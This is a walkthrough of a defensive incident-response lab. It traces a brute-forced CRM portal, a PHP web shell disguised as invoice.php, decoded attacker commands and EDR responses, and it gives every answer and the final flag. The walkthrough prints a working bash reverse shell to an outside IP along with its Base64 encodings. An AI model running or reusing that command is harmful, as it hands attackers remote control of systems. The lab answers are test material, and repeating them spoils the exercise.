Portal Drop

You are on the day shift in the ProbablyFine when the monitoring dashboard flashes red. A new alert appears in the WAF summary, reporting a web scan on crm.trypatchme.thm followed by a suspicious file upload anomaly. The affected website is TryPatchMe's public-facing CRM portal, a valued customer who provides software patching consulting services.

That should be an easy case, since you have access to both the web access logs and the EDR console. Combined, they should give you a clear answer: either it's a False Positive, or the portal has been breached and TryPatchMe needs to patch the CRM now!

crm.trypatchme.thm

---


What is the IP address that initiated the brute force on the CRM web portal?

To identify the source of the brute-force attack, the access log was filtered for HTTP status codes 401 (Unauthorized) and 403 (Forbidden), which indicate failed or denied authentication attempts.

```
grep -E "401|403" access-combined-crm-1767978582478-1768841821765.log
```
These status codes are commonly associated with unsuccessful login attempts on web portals. While multiple IP addresses generated 401 and 403 responses, brute-force behavior is characterized by repeated failed authentication attempts from the same source within a short time frame.

Upon reviewing the filtered results, the IP address 34.67.91.83 appeared significantly more frequently than other IPs, indicating repeated login failures against the CRM web portal. This pattern is consistent with a brute-force attack.


<img width="1162" height="329" alt="image" src="https://github.com/user-attachments/assets/2bbbd536-db3f-4afc-aa0d-13aeed7f8258" />

`Answer: 34.67.91.83`


---

How many successful and failed logins are seen in the logs?
Answer Example: 42, 56

```
grep 'POST /CRM/login.php HTTP/1.1' access-combined-crm-1767978582478-1768841821765.log  | grep ' 200 ' | wc -l && grep 'POST /CRM/login.php HTTP/1.1' access-combined-crm-1767978582478-1768841821765.log | grep -E '401|404' | wc -l
```

The command looks only at CRM login attempts. It counts how many logins succeeded and how many failed based on the HTTP response codes returned by the server.

<img width="1884" height="81" alt="image" src="https://github.com/user-attachments/assets/ac96fa28-e68b-441d-a916-1a4f76403d49" />

`Answer: 18, 35`

---

Following the brute force, which user-agent was used for the file upload?

The User-Agent python-requests/2.31.0 indicates that the file upload was performed using the Python Requests library. This User-Agent is commonly associated with automated scripts rather than standard web browsers, suggesting the upload was part of scripted post-brute-force activity.

<img width="1911" height="561" alt="image" src="https://github.com/user-attachments/assets/d16395a4-0a78-4625-8224-c980fe1d71b6" />

`Answer: python-requests/2.31.0`

---


What was the name of the suspicious file uploaded by the attacker?

The uploaded file invoice.php is suspicious because it is a server-side executable PHP file disguised as a legitimate document and was uploaded using an automated script following a brute-force login.

<img width="1901" height="560" alt="image" src="https://github.com/user-attachments/assets/fc2c1208-d8a1-4f20-88dc-c4bf346cfdd3" />

`Answer: invoice.php`

---

At what time did the attacker first invoke the uploaded script?
Answer Example: 2025-10-24 15:35:50

This is the earliest timestamp where the attacker directly accessed the uploaded PHP file (invoice.php), indicating the first execution of the malicious script. Earlier timestamps correspond to login attempts or file upload actions, not script invocation.

<img width="1058" height="564" alt="image" src="https://github.com/user-attachments/assets/fe91afcc-bb1e-4b76-bf2f-462a65a01042" />

`Answer: 2025-11-06 14:27:34`

---

What is the first decoded command the attacker ran on the CRM?

<img width="1904" height="563" alt="image" src="https://github.com/user-attachments/assets/08e07fc3-348c-4b69-84b1-fb92031f0c77" />

Use cyberchef to decode. 

<img width="1534" height="474" alt="image" src="https://github.com/user-attachments/assets/8a5a36c1-8bed-4496-8bce-6b4b98a4a681" />

ZDJodllXMXA - d2hvYW1p - whoami

The first invocation of the uploaded script included a Base64-encoded command passed via the q parameter. Decoding the value ZDJodllXMXA reveals the command whoami, which is commonly used by attackers to identify the execution context after gaining access.

`Answer: whoami`

---

Based on the attacker’s activity on the CRM, which MITRE ATT&CK Persistence sub-technique ID is most applicable?

<img width="1754" height="702" alt="image" src="https://github.com/user-attachments/assets/90af450d-5e82-47be-9af7-7445ad57f4c4" />

The attacker achieved persistence by uploading a malicious PHP file (invoice.php) to the CRM application, consistent with T1505.003 (Web Shell). This allowed ongoing remote access and command execution on the server beyond the initial brute-force authentication.

`Answer: T1505.003`

---

Which process image executes attacker commands received from the web?

<img width="907" height="607" alt="image" src="https://github.com/user-attachments/assets/3fd20c12-601b-4b53-8e23-8b286a67af0c" />

`Answer: /usr/sbin/php-fpm7.4`

---

What command allowed the attacker to open a bash reverse shell?

<img width="1908" height="617" alt="image" src="https://github.com/user-attachments/assets/87457bbf-9cfc-457e-b844-a1f09e925b44" />

Use cyberchef to decode. 

WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1UVXVOVGd1TVRRNExqZzJMemd3T0RBZ01ENG1NUT09
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTUuNTguMTQ4Ljg2LzgwODAgMD4mMQ==
bash -i >& /dev/tcp/115.58.148.86/8080 0>&1

<img width="1148" height="468" alt="image" src="https://github.com/user-attachments/assets/2331d6ee-8c10-4d28-840a-1596f5048976" />

The attacker decoded and executed a Base64-encoded command that launched a Bash reverse shell connecting back to 115.58.148.86:8080.

`Answer: bash -i >& /dev/tcp/115.58.148.86/8080 0>&1`

---

Which Linux user executes the entered malicious commands?

<img width="1805" height="690" alt="image" src="https://github.com/user-attachments/assets/b8b52636-4435-46b0-b912-07a6189f4190" />

`Answer: www-data`

---

What sensitive CRM configuration file did the attacker access? 

<img width="1495" height="688" alt="image" src="https://github.com/user-attachments/assets/c0be4f9b-04bb-4538-a6d5-b4e3cd93ca16" />

`Answer:  /etc/trycrm/config.json`


---

Which domain was used to exfiltrate the CRM portal database?

<img width="1505" height="722" alt="image" src="https://github.com/user-attachments/assets/4128f2b4-9265-49ee-89fc-10b633d67b48" />

`Answer:  portaldrop2025.xyz`

---

What flag do you get after completing all 12 EDR response actions?

```
Hands-On-Keyboard Root Activity
Summary:
The system experiences a spike of interactive actions originating from root. The activity pattern and time deviate from the baseline. Review the process tree for details.

Actions/Response
- Close as FP if Actions Approved
- Contact the User Behind the Login
- Review Changes to Nginx Config
```

```
Unusual User Behavior: System Discovery
Summary:
The www-data user within the non-interactive session performs extensive system discovery. The behavior and launched commands are atypical for the user.

Actions/Response
- Block Flagged Domain/IP
- Analyze the Root Cause
- Isolate the Host for DFIR
```

```
Parent-Child Anomaly: Shell Spawn
Summary:
A trusted php-fpm (worker) process unexpectedly spawned /bin/bash command shell with suspicious arguments. The behavior is unusual for that specific process and might indicate a breach.

Actions/Response
- Block Flagged IPv4
- Terminate Bash Process
```

```
Suspicious File Write: Backdoor:PHP/Generic
Summary:
A suspicious file write was detected in the application uploads directory. The file was written by php-fpm (worker, www-data) under apache2.

Actions/Response
- Quarantine invoice.php File
- Analyze the Root Cause
- Collect invoice.php File
```

`Answer:  THM{p0rtal_dropp3d?}`
